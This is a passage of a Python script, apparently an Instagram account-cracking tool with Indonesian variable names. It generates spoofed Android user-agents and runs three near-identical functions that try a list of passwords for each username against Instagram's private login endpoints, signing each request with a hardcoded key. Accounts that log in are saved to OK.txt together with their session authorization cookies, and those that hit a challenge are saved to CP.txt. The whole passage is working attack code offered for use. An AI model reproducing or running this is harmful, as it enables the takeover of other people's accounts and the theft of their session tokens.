14','253447807','253447811','253447817','253447813','181496411','253447806','255191971','255013798','255777478','255777471','255777474','255777472','255959637','255777477','255959614','255959635','256099199','256099204','150338064','256099153','256099205','256099156','255983744','256107300','255777470','126223536','256203326','256099190','256099151','256324061','256324047','256203339','256966628','256966589','256966626','256966590','124584015','257456576','256966593','257456590','256966629','256966587','256966592','257456586','257456539','259829115','259829104','259829113','260037038','259829105','259829109','260037030','260149625','259829103','260149621','260465044','259829116','260724710','179155058','261079769','261079761','261079768','261079762','261079771','261276939','157405370','135374885','261079765','261393056','261393062','261079760','181496406','182747360','261504698','261690888','261504706','169474957','262218766','262290715','262290774','262372432','262372425','262372431','262886993','262886995','262372426','262886987','261079764','262886986','262886988','262886990','262372433','262886996','263652962','264009049','264009019','264009030','264009021','264009023','264009052','264009024','261763534','174081651','169474965','232867942','264009013','255959606','264009028','267397344','267397322','267925737','267397343','267925708','267397327','267397321','267925714','267258517','267925705','268773287','267925733','268773233','267925702','268773286','159526770','268773239','268773272','269790795','269285030','269790805','269790803','269790792','268773227','269849047','270426177','270426174','271182277','269790789','271182270','268773290','271182266','271182276','269790798','271182279','271182265','271182267','269790807','271823819','272382110','272382111','272382106','272693584','272382095','272382093','272382098','272382100','272382103','273728833','273371577','273728832','273728798','273907093','273907111','273907108','238093987','273907112','273907103','274774869','274774891','274774908','273907087','274774904','274774875','274774914','275292626','276027938','276028040','276027963','276028037','276028020','276028017','274774862','276028013','249507580','276028029','273907098','277249238','277249248','277249249','276028033','277249250','277249226','275292623','277249214','277249242','277249237','277249240','278625447','278002558','278625420','278625431','278625423','117539687','278625416','278625444','277249213','278625451','279469964','279996068','279996060','279996067','279996058','280194220','279996065','279996063','279996061','279996059','280894196','273728787','271182262','281579032','281579023','276514494','281579021','281579027','281579033','268773274','283072590','281579025','283072571','282619332','283489774','283072587','283072567','281579031','283072580','283072574','284459213','284459224','179155089','256966583','284459214','283072585','284459218','284459223','284459225','285338607','275113919','284459221','284459212','284459215','285855793','285855800','285855803','285855791','285855802','285855804','285855795','286809973','287420974','287421023','287420968','287420979','287421017','287421005','287421019','287421012','277249241','288682406','287421026','288682405','288682397','288682407','261079772','288682398','288682401','288205409','289692198','287420997','289692186'])
    igv=("42.0.0.19.95,42.0.0.19.95,42.0.0.19.95,40.0.0.14.95,42.0.0.19.95,42.0.0.19.95,43.0.0.10.97,42.0.0.19.95,42.0.0.19.95,33.0.0.11.92,45.0.0.17.93,43.0.0.10.97,45.0.0.17.93,43.0.0.10.97,20.0.0.29.75,46.0.0.15.96,48.0.0.15.98,47.0.0.16.96,47.0.0.16.96,24.0.0.12.201,44.0.0.9.93,54.0.0.14.82,23.0.0.14.135,28.0.0.7.284,51.0.0.20.85,24.0.0.12.201,45.0.0.17.93,55.0.0.12.79,28.0.0.7.284,55.0.0.12.79,55.0.0.12.79,48.0.0.15.98,46.0.0.15.96,27.0.0.11.97,55.0.0.12.79,56.0.0.13.78,27.0.0.11.97,44.0.0.9.93,45.0.0.17.93,27.0.0.11.97,24.0.0.12.201,56.0.0.13.78,51.0.0.20.85,44.0.0.9.93,32.0.0.16.94,44.0.0.9.93,45.0.0.17.93,48.0.0.15.98,46.0.0.15.96,24.0.0.12.201,23.0.0.14.135,43.0.0.10.97,45.0.0.17.93,44.0.0.9.93,48.0.0.15.98,46.0.0.15.96,25.0.0.26.136,49.0.0.15.89,12.0.0.7.91,49.0.0.15.89,32.0.0.16.94,24.0.0.12.201,43.0.0.10.97,44.0.0.9.93,54.0.0.14.82,25.0.0.26.136,25.0.0.26.136,56.0.0.13.78,48.0.0.15.98,55.0.0.12.79,55.0.0.12.79,23.0.0.14.135,32.0.0.16.94,46.0.0.15.96,23.0.0.14.135,48.0.0.15.98,55.0.0.12.79,55.0.0.12.79,27.0.0.11.97,48.0.0.15.98,27.0.0.11.97,49.0.0.15.89,45.0.0.17.93,55.0.0.12.79,43.0.0.10.97,27.0.0.11.97,59.0.0.23.76,43.0.0.10.97,48.0.0.15.98,24.0.0.12.201,48.0.0.15.98,30.0.0.12.95,48.0.0.15.98,34.0.0.12.93,24.0.0.12.201,48.0.0.15.98,40.0.0.14.95,43.0.0.10.97,45.0.0.17.93,49.0.0.15.89,28.0.0.7.284,46.0.0.15.96,44.0.0.9.93,43.0.0.10.97,45.0.0.17.93,49.0.0.15.89,10.30.0,45.0.0.17.93,24.0.0.12.201,48.0.0.15.98,26.0.0.13.86,22.0.0.17.68,46.0.0.15.96,40.0.0.14.95,103.1.0.15.119,113.0.0.39.122,121.0.0.29.119,121.0.0.29.119,123.0.0.21.114,123.0.0.21.114,122.0.0.29.238,123.0.0.21.114,123.0.0.21.114,115.0.0.26.111,124.0.0.17.473,122.0.0.29.238,117.0.0.28.123,126.0.0.25.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,123.0.0.21.114,124.0.0.17.473,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,126.0.0.25.121,127.0.0.30.121,127.0.0.30.121,126.0.0.25.121,127.0.0.30.121,125.0.0.20.126,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,126.0.0.25.121,110.0.0.16.119,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,128.0.0.26.128,116.0.0.34.121,124.0.0.17.473,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,105.0.0.18.119,128.0.0.26.128,124.0.0.17.473,128.0.0.26.128,123.0.0.21.114,128.0.0.26.128,129.0.0.2.119,128.0.0.26.128,128.0.0.26.128,123.0.0.21.114,128.0.0.26.128,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,120.0.0.29.118,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,126.0.0.25.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,126.0.0.25.121,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,126.0.0.25.121,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,126.0.0.25.121,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,66.0.0.11.101,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,130.0.0.31.121,116.0.0.34.121,127.0.0.30.121,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,124.0.0.17.473,129.0.0.29.119,129.0.0.29.119,130.0.0.31.121,128.0.0.26.128,130.0.0.31.121,130.0.0.31.121,123.0.0.21.114,128.0.0.26.128,128.0.0.26.128,109.0.0.18.124,113.0.0.39.122,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,129.0.0.29.119,126.0.0.25.121,130.0.0.31.121,129.0.0.29.119,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,110.0.0.16.119,131.0.0.23.116,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,131.0.0.23.116,130.0.0.31.121,130.0.0.31.121,127.0.0.30.121,130.0.0.31.121,131.0.0.23.116,131.0.0.23.116,130.0.0.31.121,131.0.0.23.116,131.0.0.25.116,130.0.0.31.121,8.4.0,131.0.0.23.116,131.0.0.25.116,129.0.0.29.119,82.0.0.13.119,129.0.0.29.119,65.0.0.12.86,131.0.0.25.116,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,131.0.0.25.116,124.0.0.17.473,36.0.0.13.91,106.0.0.24.118,131.0.0.25.116,131.0.0.25.116,83.0.0.20.111,131.0.0.25.116,109.0.0.18.124,36.0.0.13.91,131.0.0.25.116,131.0.0.25.116,131.0.0.25.116,130.0.0.31.121,131.0.0.25.116,131.0.0.25.116,130.0.0.31.121,131.0.0.25.116,131.0.0.25.116,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,84.0.0.21.105,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,133.0.0.7.120,116.0.0.34.121,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,117.0.0.28.123,123.0.0.21.114,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,126.0.0.25.121,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,104.0.0.21.118,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,125.0.0.20.126,132.0.0.26.134,132.0.0.26.134,128.0.0.19.128,132.0.0.26.134,121.0.0.29.119,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,133.0.0.32.120,122.0.0.29.238,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,131.0.0.25.116,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,131.0.0.23.116,128.0.0.26.128,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,123.0.0.21.114,133.0.0.32.120,127.0.0.30.121,133.0.0.32.120,133.0.0.32.120,123.0.0.21.114,133.0.0.32.120,131.0.0.23.116,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,131.0.0.25.116,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,128.0.0.26.128,133.0.0.32.120,111.1.0.25.152,133.0.0.32.120,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,130.0.0.31.121,133.0.0.32.120,133.0.0.32.120,128.0.0.26.128,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,87.0.0.18.99,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,97.0.0.32.119,131.0.0.25.116,129.0.0.29.119,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,127.0.0.30.121,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,111.1.0.25.152,129.0.0.29.119,134.0.0.26.121,131.0.0.25.116,134.0.0.26.121,134.0.0.26.121,84.0.0.21.105,127.0.0.30.121,134.0.0.26.121,124.0.0.17.473,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,80.0.0.14.110,133.0.0.32.120,134.0.0.26.121,123.0.0.21.114,134.0.0.26.121,102.0.0.20.117,131.0.0.23.116,131.0.0.25.116,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,102.0.0.20.117,80.0.0.14.110,87.0.0.18.99,134.0.0.26.121,93.1.0.19.102,134.0.0.26.121,134.0.0.26.121,129.0.0.29.119,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,122.0.0.29.238,134.0.0.26.121,134.0.0.26.121,124.0.0.17.473,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,96.0.0.28.114,129.0.0.29.119,131.0.0.25.116,131.0.0.23.116,135.0.0.15.119,124.0.0.17.473,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,131.0.0.25.116,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,129.0.0.29.119,134.0.0.26.121,134.0.0.26.121,131.0.0.25.116,131.0.0.23.116,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,123.0.0.21.114,134.0.0.26.121,130.0.0.31.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,131.0.0.23.116,104.0.0.21.118,122.0.0.29.238,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,127.0.0.30.121,134.0.0.26.121,134.0.0.26.121,123.0.0.21.114,133.0.0.32.120,123.0.0.21.114,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,84.0.0.21.105,131.0.0.23.116,133.0.0.32.120,128.0.0.26.128,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121")
    igve=igv.split(",")
    versi=random.choice(igve)
    ua1 = f'Instagram {versi} Android ({andro}; {dpis}; {pxl}; INFINIX MOBILITY LIMITED/Infinix; Infinix X657B; Infinix-X657B; mt6761; in_ID; {kode})'
    ua2 = f'Instagram {versi} Android ({andro}; {dpis}; {pxl}; vivo; vivo 1820; 1820; mt6762; {basa}; {kode})'
    ua3 = f'Instagram {versi} Android ({andro}; {dpis}; {pxl}; OPPO; CPH2109; OP4BA5L1; qcom; {basa}; {kode})'
    ua4 = f'Instagram {versi} Android ({andro}; {dpis}; {pxl}; Xiaomi/xiaomi; Redmi Note 8; ginkgo; qcom; {basa}; {kode})'
    uaa = rc([ua1,ua2,ua3,ua4])
    return uaa

def i_insta(username, password):
    global hitung,success,checkpoint, login
    karangjambu.update(purbalingga,description=f'i.instagram.com {hitung}/{len(all_items)} success:[bold green]{success} [bold white]checkpoint:[bold blue]{checkpoint}')
    karangjambu.advance(purbalingga)
    for pw in password:
        try:
            request = login['Lib']
            if requests == 'req':ses=requests.Session()
            else:ses=httpx
            curl    = ses.get('https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid='+str(uuid.uuid4()))
            payload = json.dumps({
                 'phone_id': str(uuid.uuid4()),
                 '_csrftoken': curl.cookies.get('csrftoken','TeWMHnpFe4nja5IPA2bBUjOiVMwndp5E'),
                 'username': username,
                 'guid': str(uuid.uuid4()),
                 'device_id': 'android-'+str(uuid.uuid4()),
                 'password': pw,
                 'login_attempt_count': '0',
               }
            )
            param  = hmac.new('4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178'.encode('utf-8'),payload.encode('utf-8'),hashlib.sha224).hexdigest() +'.'+ urllib.parse.quote(payload)
            encod  = f'ig_sig_key_version=4&signed_body={param}'
            header = {
                 'Authority': 'i.instagram.com',
                 'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                 'Connection': 'Close',
                 'User-Agent': UserAgent(),
                 'X-IG-Capabilities': 'Fw==',
                 'X-IG-App-ID': '936619743392459',
                 'Cookie': f'csrftoken={curl.cookies.get("csrftoken")};mid={curl.cookies.get("mid")};dpr=2;ig_nrcb=1'
            }
            response = ses.post('https://i.instagram.com/api/v1/accounts/login/', data=encod, headers=header)
            if 'logged_in_user' in str(response.text):
                 success +=1
                 kuki = convert_cookie(response.headers.get('set-cookie'))
                 auth = f"{response.headers.get('ig-set-authorization')};{kuki}"
                 followers, following = info(username)
                 cetak = Tree('\r',style='bold green')
                 cetak.add('%s|%s'%(username,pw))
                 cetak.add('%s|%s'%(followers, following))
                 cetak.add(auth)
                 sprint(cetak)
                 with open('OK.txt',mode='a', encoding='utf-8') as sv:
                    sv.write('%s|%s|%s|%s|%s\n'%(username,pw,followers, following,auth))
                 sv.close()
                 break
            elif 'https://i.instagram.com/challenge/' in str(response.text):
                 checkpoint +=1
                 followers, following = info(username)
                 cetak = Tree('',style='bold blue')
                 cetak.add('%s|%s'%(username,pw))
                 cetak.add('%s|%s'%(followers, following))
                 cetak.add(header['User-Agent'])
                 sprint(cetak)
                 with open('CP.txt',mode='a', encoding='utf-8') as sv:
                    sv.write('%s|%s\n'%(username,pw))
                 sv.close()
                 break
        except (httpx.RemoteProtocolError,requests.exceptions.ConnectionError,httpx.ConnectError):time.sleep(30)
    hitung +=1

def api_insta(username, password):
    global hitung,success,checkpoint, login
    karangjambu.update(purbalingga,description=f'api.instagram.com {hitung}/{len(all_items)} success:[bold green]{success} [bold white]checkpoint:[bold blue]{checkpoint}')
    karangjambu.advance(purbalingga)
    for pw in password:
        try:
            request = login['Lib']
            if requests == 'req':ses=requests.Session()
            else:ses=httpx
            curl    = ses.get('https://api.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid='+str(uuid.uuid4()))
            payload = json.dumps({
                 'phone_id': str(uuid.uuid4()),
                 '_csrftoken': curl.cookies.get('csrftoken',''),
                 'username': username,
                 'guid': str(uuid.uuid4()),
                 'device_id': 'android-'+str(uuid.uuid4()),
                 'password': pw,
                 'from_reg': 'false',
                 'login_attempt_count': '0',
               }
            )
            param  = hmac.new('4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178'.encode('utf-8'),payload.encode('utf-8'),hashlib.sha224).hexdigest() +'.'+ urllib.parse.quote(payload)
            encod  = f'ig_sig_key_version=4&signed_body={param}'
            header = {
                 'Authority': 'api.instagram.com',
                 'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                 'X-IG-Connection-Speed': f'{random.randint(100,999)}kbps',
                 'Accept': '*/*',
                 'X-IG-Connection-Type': random.choice(['MOBILE(LTE)', 'WIFI']),
                 'X-IG-App-ID': '936619743392459',
                 'Accept-Encoding': 'br, gzip, deflate',
                 'Accept-Language': 'id-ID',
                 'X-IG-ABR-Connection-Speed-KBPS': '0',
                 'User-Agent': UserAgent(),
                 'Connection': 'keep-alive',
                 'X-IG-Capabilities': '36r/dw==',
                 'Cookie': f'csrftoken={curl.cookies.get("csrftoken")};mid={curl.cookies.get("mid")};dpr=2'
            }
            response = ses.post('https://api.instagram.com/api/v1/accounts/login/', data=encod, headers=header)
            if 'logged_in_user' in str(response.text):
                 success +=1
                 kuki = convert_cookie(response.headers.get('Set-Cookie'))
                 auth = f"{response.headers.get('ig-set-authorization')};{kuki}"
                 followers, following = info(username)
                 cetak = Tree('\r',style='bold green')
                 cetak.add('%s|%s'%(username,pw))
                 cetak.add('%s|%s'%(followers, following))
                 cetak.add(auth)
                 sprint(cetak)
                 with open('OK.txt',mode='a', encoding='utf-8') as sv:
                    sv.write('%s|%s|%s|%s|%s\n'%(username,pw,followers, following,auth))
                 sv.close()
                 break
            elif 'https://i.instagram.com/challenge/' in str(response.text):
                 checkpoint +=1
                 followers, following = info(username)
                 cetak = Tree('',style='bold blue')
                 cetak.add('%s|%s'%(username,pw))
                 cetak.add('%s|%s'%(followers, following))
                 cetak.add(header['User-Agent'])
                 sprint(cetak)
                 with open('CP.txt',mode='a', encoding='utf-8') as sv:
                    sv.write('%s|%s|%s|%s'%(username,pw,followers, following))
                 sv.close()
                 break
        except (httpx.RemoteProtocolError,requests.exceptions.ConnectionError,httpx.ConnectError):time.sleep(30)
    hitung +=1

def www_insta(username, password):
    global hitung,success,checkpoint, login
    karangjambu.update(purbalingga,description=f'www.instagram.com {hitung}/{len(all_items)} success:[bold green]{success} [bold white]checkpoint:[bold blue]{checkpoint}')
    karangjambu.advance(purbalingga)
    for pw in password:
        try:
            request = login['Lib']
            if requests == 'req':ses=requests.Session()
            else:ses=httpx
            curl    = ses.get('https://www.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid='+str(uuid.uuid4()))
            payload = json.dumps({
                 'phone_id': str(uuid.uuid4()),
                 '_csrftoken': curl.cookies.get('csrftoken','TeWMHnpFe4nja5IPA2bBUjOiVMwndp5E'),
                 'username': username,
                 'guid': str(uuid.uuid4()),
                 'device_id': 'android-'+str(uuid.uuid4()),
                 'password': pw,
                 'login_attempt_count': '0',
               }
            )
            param  = hmac.new('4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178'.encode('utf-8'),payload.encode('utf-8'),hashlib.sha224).hexdigest() +'.'+ urllib.parse.quote(payload)
            encod  = f'ig_sig_key_version=4&signed_body={param}'
            header = {
                 'Authority': 'api.instagram.com',
                 'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                 'X-IG-Connection-Speed': f'{random.randint(100,999)}kbps',
                 'Accept': '*/*',
                 'X-IG-Connection-Type': random.choice(['MOBILE(LTE)', 'WIFI']),
                 'X-IG-App-ID': '936619743392459',
                 'Accept-Language': 'id-ID',
                 'X-IG-ABR-Connection-Speed-KBPS': '0',
                 'User-Agent': UserAgent(),
                 'Connection': 'keep-alive',
                 'X-IG-Capabilities': '36r/dw==',
                 'Cookie': f'csrftoken={curl.cookies.get("csrftoken")};mid={curl.cookies.get("mid")};dpr=2'
            }
            response = ses.post('https://www.instagram.com/api/v1/accounts/login/', data=encod, headers=header)
            if 'logged_in_user' in str(response.text):
                 success +=1
                 kuki = convert_cookie(response.headers.get('Set-Cookie'))
                 auth = f"{response.headers.get('ig-set-authorization')};{kuki}"
                 followers, following = info(username)
                 cetak = Tree('\r',style='bold green')
                 cetak.add('%s|%s'%(username,pw))
                 cetak.add('%s|%s'%(followers, following))
                 cetak.add(auth)
                 sprint(cetak)
                 with open('OK.txt',mode='a', encoding='utf-8') as sv:
                    sv.write('%s|%s|%s|%s|%s\n'%(username,pw,followers, following,auth))
                 sv.close()
                 break
            elif 'https://i.instagram.com/challenge/' in str(response.text):
                 checkpoint +=1
                 followers, following = info(username)
                 cetak = Tree('',style='bold blue')
                 cetak.add('%s|%s'%(username,pw))
                 cetak.add('%s/%s'%(followers, following))
                 cetak.add(header['User-Agent'])
                 sprint(cetak)
                 with open('CP.txt',mode='a', encoding='utf-8') as sv:
                    sv.write('%s|%s|%s|%s\n'%(username,pw,followers, following))
                 sv.close()
                 break
        except (httpx.RemoteProtocolError,requests.exceptions.ConnectionError,httpx.ConnectError):time.sleep(30)
    hitung +=1

def create_direc():
    try:os.mkdir('data')
    except:pass
    MenuCrack()

if __name__ == '__main__':
   create_direc()
